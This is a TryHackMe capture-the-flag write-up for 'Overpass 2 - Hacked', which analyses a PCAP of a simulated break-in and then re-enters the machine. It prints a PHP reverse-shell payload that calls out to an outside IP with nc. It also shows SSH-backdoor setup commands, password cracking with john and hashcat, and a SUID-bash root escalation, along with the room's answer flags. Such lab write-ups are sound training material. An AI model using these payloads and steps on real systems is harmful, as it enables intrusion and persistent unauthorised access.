# TryHackMe [Overpass 2 - Hacked](https://tryhackme.com/room/overpass2hacked)
### References
* Hammond, J. (2020). TryHackMe! Overpass 2 Recovering from THE HACK [YouTube Video]. In YouTube. https://youtu.be/XtySdRYCbiY
## Forensics - Analyse the PCAP
### What was the URL of the page they used to upload a reverse shell?
* Filter for HTTP traffic, the response for the GET `/development/` request contains an HTML upload form (visible by following the HTTP stream):
```html
<body>
  <nav>
    <img class="logo" src="/img/overpass.svg" alt="Overpass logo">
    <h2 class="navTitle"><a href="/">Overpass</a></h2>
    <a href="/aboutus">About Us</a>
    <a href="/downloads">Downloads</a>
  </nav>
  <div class="bodyFlexContainer content">
    <div>
      <div>
        <h3 class="formTitle">Overpass Cloud Sync - BETA</h1>
      </div>
      <!-- Muiri tells me this is insecure, I only learnt PHP this week so maybe I should let him fix it? Something about php eye en eye? -->
      <!-- TODO add downloading of your overpass files -->
      <form action="upload.php" method="post" enctype="multipart/form-data">
        <div class="formElem"><label for="fileToUpload">Upload your .overpass file for cloud synchronisation</label><input type="file"
            name="fileToUpload" id="fileToUpload"></div>
        <div class="formElem"><input type="submit" value="Upload File" name="submit"></div>
      </form>
    </div>
  </div>
```
![HTTP GET request for `/development/`](development.jpg)

**Answer**: `/development/`
### What payload did the attacker use to gain access?
* Filter for HTTP traffic, the response for the POST `/development/upload.php` request contains a PHP payload (visible by following the HTTP stream):
```php
<?php exec("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.170.145 4242 >/tmp/f")?>
```
![HTTP POST request for `/development/upload.php`](development_upload_php.jpg)

**Answer**: `<?php exec("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.170.145 4242 >/tmp/f")?>`
### What password did the attacker use to escalate privileges?
1. Filter for the 3rd TCP stream (with `tcp.stream eq 3`, the first 2 TCP streams are part of the HTTP GET and POST requests), and follow the stream.
2. In that stream, we can see the shell session the attacker used and the password that was entered:
```bash
$ su james
Password: whenevernoteartinstant
```
**Answer**: `whenevernoteartinstant`
### How did the attacker establish persistence?
1. Filter for the 3rd TCP stream (with `tcp.stream eq 3`, the first 2 TCP streams are part of the HTTP GET and POST requests), and follow the stream.
2. In that stream, we can see the shell session the attacker used and the tools that were downloaded:
```bash
james@overpass-production:~$ git clone https://github.com/NinjaJc01/ssh-backdoor
james@overpass-production:~$ cd ssh-backdoor
james@overpass-production:~/ssh-backdoor$ ssh-keygen
james@overpass-production:~/ssh-backdoor$ chmod +x backdoor
james@overpass-production:~/ssh-backdoor$ ./backdoor -a 6d05358f090eea56a238af02e47d44ee5489d234810ef6240280857ec69712a3e5e370b8a41899d0196ade16c0d54327c5654019292cbfe0b5e98ad1fec71bed
```

**Answer**: `https://github.com/NinjaJc01/ssh-backdoor`
### Using the `fasttrack` word list, how many of the system passwords were crackable?
* `john` managed to crack 4 passwords out of the [shadow file](shadow):
```bash
$  john shadow --wordlist=$(pwd)/fasttrack.txt
Using default input encoding: UTF-8
Loaded 5 password hashes with 5 different salts (sha512crypt, crypt(3) $6$ [SHA512 128/128 AVX 2x])
Cost 1 (iteration count) is 5000 for all loaded hashes
Will run 12 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
secret12         (bee)
abcd123          (szymex)
1qaz2wsx         (muirland)
secuirty3        (paradox)
4g 0:00:00:00 DONE (2021-05-01 12:01) 21.05g/s 947.3p/s 4736c/s 4736C/s P@55w0rd..starwars
Use the "--show" option to display all of the cracked passwords reliably
Session completed
```

**Answer**: `4`
## Research - Analyse the code
### What's the default hash for the backdoor?
* The [main.go file](ssh-backdoor/main.go) contains the default hash as a `hash` variable:
```go
var hash string = "bdd04d9bb7621687f5df9001f5098eb22bf19eac4c2c30b6f23efed4d24807277d0f8bfccb9e77659103d78c56e66d2d7d8391dfc885d0e9b68acd01fc2170e3"
```

**Answer**: `bdd04d9bb7621687f5df9001f5098eb22bf19eac4c2c30b6f23efed4d24807277d0f8bfccb9e77659103d78c56e66d2d7d8391dfc885d0e9b68acd01fc2170e3`
### What's the hardcoded salt for the backdoor?
* The [main.go file](ssh-backdoor/main.go) contains 3 functions related to hashing:
  * `hashPassword`:
	```go
	func hashPassword(password string, salt string) string {
		hash := sha512.Sum512([]byte(password + salt))
		return fmt.Sprintf("%x", hash)
	}
	```
  * `verifyPass`
	```go
	func verifyPass(hash, salt, password string) bool {
		resultHash := hashPassword(password, salt)
		return resultHash == hash
	}
	```
  * `passwordHandler` passes a salt-looking string as an argument to the `verifyPass` functions' `salt` argument in order to verify the backdoor password:
	```go
	func passwordHandler(_ ssh.Context, password string) bool {
		return verifyPass(hash, "1c362db832f3f864c8c2fe05f2002a05", password)
	}
	```

**Answer**: `1c362db832f3f864c8c2fe05f2002a05`
### What was the hash that the attacker used? - go back to the PCAP for this!
1. The [main.go file](ssh-backdoor/main.go) accepts the `-a` flag for the hash input:
```go
flaggy.String(&hash, "a", "hash", "Hash for backdoor")
```
2. Filter for the 3rd TCP stream (with `tcp.stream eq 3`, the first 2 TCP streams are part of the HTTP GET and POST requests), and follow the stream.
3. In that stream, we can see the shell session the attacker used and the CLI arguments that were used:
```bash
james@overpass-production:~/ssh-backdoor$ ./backdoor -a 6d05358f090eea56a238af02e47d44ee5489d234810ef6240280857ec69712a3e5e370b8a41899d0196ade16c0d54327c5654019292cbfe0b5e98ad1fec71bed
```

**Answer**: `6d05358f090eea56a238af02e47d44ee5489d234810ef6240280857ec69712a3e5e370b8a41899d0196ade16c0d54327c5654019292cbfe0b5e98ad1fec71bed`
### Crack the hash using `rockyou.txt` and a cracking tool of your choice. What's the password?
* I could not get my OpenCL runtime to work on Manjaro with the Mesa drivers. The answer to this question was obtained by watching [John Hammond's video](https://youtu.be/XtySdRYCbiY).
```bash
$ hashcat -m 1710 "$(cat hash):$(cat salt)" --force $(pwd)/../../../rockyou.txt
```

**Answer**: `november16`
##  Attack - Get back in!
### The attacker defaced the website. What message did they leave as a heading?
**Answer**: `H4ck3d by CooctusClan`
### What's the user flag?
1. The SSH port is `2222` (from the [main.go file](ssh-backdoor/main.go):
```go
var lport uint = 2222
```
2. The SSH user is `james` (from the [PCAP](overpass2.pcapng)'s 3rd TCP stream).
```bash
ssh -p 2222 james@<MACHINE_IP>
james@overpass-production:/home/james/ssh-backdoor$ cd /home/james/
james@overpass-production:/home/james$ ls
ssh-backdoor  user.txt  www
james@overpass-production:/home/james$ cat user.txt 
thm{d119b4fa8c497ddb0525f7ad200e6567}
```

**Answer**: `thm{d119b4fa8c497ddb0525f7ad200e6567}`
### What's the root flag?
* There is a SUID binary (`.suid_bash`) in `james`' home directory:
```bash
james@overpass-production:/home/james$ ls -la
total 1136
drwxr-xr-x 7 james james    4096 Jul 22  2020 .
drwxr-xr-x 7 root  root     4096 Jul 21  2020 ..
lrwxrwxrwx 1 james james       9 Jul 21  2020 .bash_history -> /dev/null
-rw-r--r-- 1 james james     220 Apr  4  2018 .bash_logout
-rw-r--r-- 1 james james    3771 Apr  4  2018 .bashrc
drwx------ 2 james james    4096 Jul 21  2020 .cache
drwx------ 3 james james    4096 Jul 21  2020 .gnupg
drwxrwxr-x 3 james james    4096 Jul 22  2020 .local
-rw------- 1 james james      51 Jul 21  2020 .overpass
-rw-r--r-- 1 james james     807 Apr  4  2018 .profile
-rw-r--r-- 1 james james       0 Jul 21  2020 .sudo_as_admin_successful
-rwsr-sr-x 1 root  root  1113504 Jul 22  2020 .suid_bash
drwxrwxr-x 3 james james    4096 Jul 22  2020 ssh-backdoor
-rw-rw-r-- 1 james james      38 Jul 22  2020 user.txt
drwxrwxr-x 7 james james    4096 Jul 21  2020 www
```
2. Assuming it's a modified version of `/bin/bash`, the `-p` flag should enable access to a `root` user shell:
```bash
james@overpass-production:/home/james$ ./.suid_bash -p
.suid_bash-4.4# cat /root/root.txt
thm{d53b2684f169360bb9606c333873144d}
```

**Answer**: `thm{d53b2684f169360bb9606c333873144d}`